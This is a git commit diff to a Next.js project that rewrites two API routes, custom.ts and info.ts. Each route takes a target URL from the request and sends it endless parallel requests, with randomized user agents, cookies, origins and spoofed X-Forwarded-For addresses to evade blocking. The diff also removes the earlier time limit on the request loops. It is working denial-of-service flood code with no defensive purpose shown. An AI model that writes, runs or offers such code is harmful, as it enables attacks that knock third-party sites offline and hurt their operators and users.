1280fc46e6d7f31241ec47fe29862587e150c9ac
stratijia <stratijia@gmail.com>
2023-08-28 12:26:48 +0100

    raandp

--- pages/api/custom.ts
+++ pages/api/custom.ts
@@ -1,8 +1,22 @@
-import { request } from 'https'
 import type { NextApiRequest, NextApiResponse } from 'next'
 
 type ResponseData = {
     message: string
+}
+
+
+const rIp = () => {
+    const r = () => Math.floor(Math.random() * 255);
+    return `${r()}.${r()}.${r()}.${r()}`;
+}
+
+const rStr = (l: number) => {
+    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
+    let s = '';
+    for (let i = 0; i < l; i++) {
+        s += a[Math.floor(Math.random() * a.length)];
+    }
+    return s;
 }
 
 export default function handler(
@@ -10,12 +24,22 @@ export default function handler(
     res: NextApiResponse<ResponseData>
 ) {
 
-    for(var i = 0; i < 20; i++) {
+    for (var i = 0; i < 20; i++) {
         setInterval(() => {
-            request(`${req.query.name}?ref=${Math.random()}`)
+            fetch(`${req.query.name}?ref=${rStr(10)}`, {
+                headers: {
+                    'User-Agent': `Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko ${rStr(10)}`,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                    'Upgrade-Insecure-Requests': '1',
+                    'cookie': `key=${rStr(10)}`,
+                    'Origin': 'http://' + rStr(8) + '.com',
+                    'Referrer': 'http://google.com/' + rStr(10),
+                    'X-Forwarded-For': rIp()
+                }
+            }).then()
         })
     }
-    
+
     setTimeout(() => {
         res.status(200).json({ message: `JK-${req.query.name}` })
     }, 20 * 1000)
--- pages/api/info.ts
+++ pages/api/info.ts
@@ -4,18 +4,42 @@ type ResponseData = {
     message: string
 }
 
+
+const rIp = () => {
+    const r = () => Math.floor(Math.random() * 255);
+    return `${r()}.${r()}.${r()}.${r()}`;
+}
+
+const rStr = (l: number) => {
+    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
+    let s = '';
+    for (let i = 0; i < l; i++) {
+        s += a[Math.floor(Math.random() * a.length)];
+    }
+    return s;
+}
+
 export default function handler(
     req: NextApiRequest,
     res: NextApiResponse<ResponseData>
 ) {
 
-    for(var i = 0; i < 50; i++) {
-        const luanch = setInterval(() => {
-            fetch(`${req.query.name}?ref=${Math.random()}`).then()
+    for (var i = 0; i < 20; i++) {
+        setInterval(() => {
+            fetch(`${req.query.name}?ref=${rStr(10)}`, {
+                headers: {
+                    'User-Agent': `Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko ${rStr(10)}`,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                    'Upgrade-Insecure-Requests': '1',
+                    'cookie': `key=${rStr(10)}`,
+                    'Origin': 'http://' + rStr(8) + '.com',
+                    'Referrer': 'http://google.com/' + rStr(10),
+                    'X-Forwarded-For': rIp()
+                }
+            }).then()
         })
-        setTimeout(() => clearInterval(luanch), 60 * 1000)
     }
-    
+
     setTimeout(() => {
         res.status(200).json({ message: `JK-${req.query.name}` })
     }, 20 * 1000)
